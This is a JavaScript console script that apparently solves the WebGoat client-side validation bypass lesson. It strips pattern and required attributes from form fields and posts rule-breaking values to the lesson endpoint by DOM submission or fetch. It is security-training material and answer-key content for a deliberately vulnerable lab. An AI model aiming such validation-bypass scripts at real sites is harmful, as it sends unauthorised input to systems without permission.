// ============================================================
// Input Validation Bypass - Browser Console Attack
// ============================================================
// Copy this entire script into browser console (F12)
// ============================================================

console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('%cInput Validation Bypass Attack', 'color: cyan; font-weight: bold');
console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('');
console.log('%cGoal: Send values that VIOLATE the regex patterns', 'color: yellow');
console.log('');

// Method 1: Direct DOM manipulation and submit
function bypassValidation() {
    console.log('%c[Method 1] Direct bypass', 'color: yellow; font-weight: bold');
    console.log('');
    
    const payloads = {
        field1: 'ABC',           // Should be lowercase -> UPPERCASE
        field2: 'abc',           // Should be digits -> LETTERS
        field3: 'test!',         // Should be alphanumeric -> SPECIAL CHAR
        field4: 'ten',           // Should be one-nine -> NOT IN LIST
        field5: '1234',          // Should be 5 digits -> 4 DIGITS
        field6: '123456789',     // Should be zip format -> WRONG FORMAT
        field7: '101-234-5678'   // Should start 2-9 -> STARTS WITH 1
    };
    
    try {
        // Set all field values
        for (const [fieldName, value] of Object.entries(payloads)) {
            const field = document.querySelector(`input[name="${fieldName}"]`);
            if (field) {
                // Remove validation attributes
                field.removeAttribute('pattern');
                field.removeAttribute('required');
                field.removeAttribute('oninput');
                field.removeAttribute('onchange');
                
                // Set invalid value
                field.value = value;
                console.log(`✓ ${fieldName}: ${value}`);
            } else {
                console.warn(`⚠ Field ${fieldName} not found`);
            }
        }
        
        console.log('');
        console.log('%cSubmitting form...', 'color: green; font-weight: bold');
        
        // Submit the form
        const form = document.querySelector('form');
        if (form) {
            form.submit();
        } else {
            console.error('Form not found!');
        }
        
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Method 2: Fetch API with multiple payload attempts
async function bypassWithFetch() {
    console.log('%c[Method 2] Fetch API attack', 'color: yellow; font-weight: bold');
    console.log('');
    
    const payloadSets = [
        {
            name: 'Type violations',
            field1: 'ABC',
            field2: 'abc',
            field3: 'test!',
            field4: 'ten',
            field5: '1234',
            field6: '123456789',
            field7: '101-234-5678'
        },
        {
            name: 'Length violations',
            field1: 'abcd',
            field2: '1234',
            field3: 'test@#$',
            field4: 'zero',
            field5: '123456',
            field6: '1234',
            field7: 'abc-def-ghij'
        },
        {
            name: 'Mixed violations',
            field1: '123',
            field2: '12',
            field3: 'abc!',
            field4: '10',
            field5: 'abcde',
            field6: 'abc-1234',
            field7: '123-456-789'
        }
    ];
    
    for (const payload of payloadSets) {
        console.log(`\nTrying: ${payload.name}`);
        
        const formData = new URLSearchParams(payload);
        
        try {
            const response = await fetch('/WebGoat/BypassRestrictions/BypassValidation', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: formData.toString(),
                credentials: 'include'
            });
            
            const result = await response.json();
            
            console.log('Feedback:', result.feedback);
            
            if (result.lessonCompleted === true) {
                console.log('%c✓ SUCCESS!', 'color: green; font-weight: bold; font-size: 16px');
                console.log('Winning payload:', payload);
                return;
            }
            
        } catch (error) {
            console.error('Error:', error.message);
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// Method 3: Show current form values
function showCurrentValues() {
    console.log('%cCurrent form values:', 'color: cyan; font-weight: bold');
    console.log('');
    
    for (let i = 1; i <= 7; i++) {
        const field = document.querySelector(`input[name="field${i}"]`);
        if (field) {
            const pattern = field.getAttribute('pattern') || 'No pattern';
            console.log(`field${i}: "${field.value}" (pattern: ${pattern})`);
        }
    }
    console.log('');
}

// Display menu
console.log('%cAvailable methods:', 'color: cyan; font-weight: bold');
console.log('');
console.log('%c1. bypassValidation()    ', 'color: white', '← Direct DOM manipulation (RECOMMENDED)');
console.log('%c2. bypassWithFetch()     ', 'color: white', '← Try multiple payloads via Fetch');
console.log('%c3. showCurrentValues()   ', 'color: white', '← Show current form state');
console.log('');
console.log('%cExample: Type "bypassValidation()" and press Enter', 'color: yellow');
console.log('');
console.log('%cReminder: We need to send INVALID values (violate patterns)!', 'color: orange; font-weight: bold');
console.log('');
